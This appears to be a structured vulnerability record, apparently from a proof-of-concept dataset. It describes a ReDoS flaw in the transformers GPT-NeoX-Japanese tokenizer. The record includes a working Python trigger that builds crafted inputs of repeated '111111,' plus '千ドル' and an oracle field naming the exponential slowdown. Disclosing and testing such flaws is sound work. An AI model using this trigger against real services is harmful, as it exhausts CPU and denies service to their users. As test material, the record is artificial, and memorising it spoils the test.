title: Inefficient regular expression complexity in GPT-NeoX-Japanese tokenizer leading to ReDoS
trigger_payload:
import re
import time
from transformers import GPTNeoXJapaneseForCausalLM, GPTNeoXJapaneseTokenizer
tokenizer = GPTNeoXJapaneseTokenizer.from_pretrained(
"abeja/gpt-neox-japanese-2.7b",
do_clean_text=True,
)
for i in range(1,50):
input_str = "111111," * i + "千ドル"
start_time = time.time()
gen_text = tokenizer.decode(tokenizer(input_str)["input_ids"])
end_time = time.time()
print(f"Execution time: {end_time - start_time:.6f} s , iteration (i={i})")
oracle: Exponential increase in execution time and high CPU usage when processing specially crafted input strings
